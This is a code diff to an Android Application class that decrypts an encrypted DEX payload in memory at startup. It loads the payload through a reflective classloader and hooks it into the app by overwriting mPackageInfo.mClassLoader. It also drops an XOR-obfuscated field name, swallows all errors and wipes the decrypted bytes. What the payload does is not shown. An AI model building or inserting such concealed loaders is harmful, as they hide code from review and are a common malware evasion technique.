@@ -88,7 +88,7 @@ class BerlinAppEntry : Application() {
             // Parent must be the system classloader (not null) so decrypted classes can resolve framework types
             val b    = ClassLoader::class.java.cast(ctor.newInstance(ByteBuffer.wrap(dex), ClassLoader.getSystemClassLoader())) ?: return
             h = b; chain(b)
-        } catch (t: Throwable) { return } finally { wipe(dex) }
+        } catch (t: Throwable) { wipe(dex); return } finally { wipe(dex) }
     }
 
     override fun onCreate() { super.onCreate(); kick() }
@@ -119,11 +119,33 @@ class BerlinAppEntry : Application() {
 
     private fun chain(c: ClassLoader?) {
         if (c == null) return
+        // Inject via mPackageInfo.mClassLoader — the classloader Android uses to resolve
+        // Activities, Services and other components. This is the proven correct injection
+        // point (parent-chain patching is insufficient for component resolution).
         try {
-            val pe = byteArrayOf(0x2a,0x3b,0x28,0x3f,0x34,0x2e)
-            val pc = CharArray(pe.size); var i = 0; while (i < pe.size) { pc[i] = (pe[i].toInt() and 0xFF xor 0x5A).toChar(); i++ }
-            val f  = ClassLoader::class.java.getDeclaredField(String(pc)); f.isAccessible = true; f.set(classLoader, c)
+            var cls: Class<*>? = baseContext?.javaClass
+            var pkgInfoField: java.lang.reflect.Field? = null
+            while (cls != null && pkgInfoField == null) {
+                pkgInfoField = try { cls.getDeclaredField("mPackageInfo") } catch (_: NoSuchFieldException) { null }
+                cls = cls.superclass
+            }
+            if (pkgInfoField == null) return
+            pkgInfoField.isAccessible = true
+            val pkgInfo = pkgInfoField.get(baseContext) ?: return
+
+            var cls2: Class<*>? = pkgInfo.javaClass
+            var clField: java.lang.reflect.Field? = null
+            while (cls2 != null && clField == null) {
+                clField = try { cls2.getDeclaredField("mClassLoader") } catch (_: NoSuchFieldException) { null }
+                cls2 = cls2.superclass
+            }
+            if (clField == null) return
+            clField.isAccessible = true
+            clField.set(pkgInfo, c)
         } catch (t: Throwable) { }
+
+        // Also set thread context classloader so any thread-local Class.forName calls resolve correctly
+        try { Thread.currentThread().contextClassLoader = c } catch (t: Throwable) { }
     }
 
     private fun peel(s: InputStream?): ByteArray? {
